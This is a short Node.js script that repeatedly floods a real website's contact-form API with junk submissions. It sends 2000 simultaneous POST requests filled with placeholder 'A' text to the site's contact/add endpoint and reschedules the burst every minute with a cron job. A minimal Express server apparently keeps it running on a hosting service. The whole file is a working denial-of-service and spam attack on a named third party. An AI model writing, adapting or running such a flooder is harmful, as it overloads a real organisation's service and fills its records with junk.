const axios = require("axios");
const cron = require("node-cron");
var express = require("express");

const data = {
  data: {
    email: "aaaaa@aaa.aa",
    message:
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ",
    name: "AAAAA",
    phone: "AAAAAA",
    subject: "AAAAA",
  },
};

const makeReqs = async () => {
  try {
    const proms = [];
    for (let i = 0; i < 2000; i++) {
      proms.push(
        new Promise((a, r) => {
          axios
            .post("https://new.nsc.com.co/api/contact/add", data)
            .then((resp) => {
              // console.log(resp?.data?.result?.insertId);
              a();
            })
            .catch(() => {
              r();
            });
        })
      );
    }
    Promise.allSettled(proms);
    setTimeout(() => Promise.allSettled(proms), 5000);
    setTimeout(() => Promise.allSettled(proms), 10000);
    setTimeout(() => Promise.allSettled(proms), 15000);
    setTimeout(() => Promise.allSettled(proms), 20000);
    setTimeout(() => Promise.allSettled(proms), 25000);
    setTimeout(() => Promise.allSettled(proms), 30000);
    setTimeout(() => Promise.allSettled(proms), 35000);
    setTimeout(() => Promise.allSettled(proms), 40000);
    setTimeout(() => Promise.allSettled(proms), 45000);
    setTimeout(() => Promise.allSettled(proms), 50000);
    setTimeout(() => Promise.allSettled(proms), 55000);
  } catch (e) {
    console.log(e);
  }
};

cron.schedule("* * * * *", function () {
  console.log("running script");
  makeReqs();
});

var app = express();

app.get("/", function (req, res) {
  res.send("Hello World");
});

app.listen(process.env.PORT || 5000);
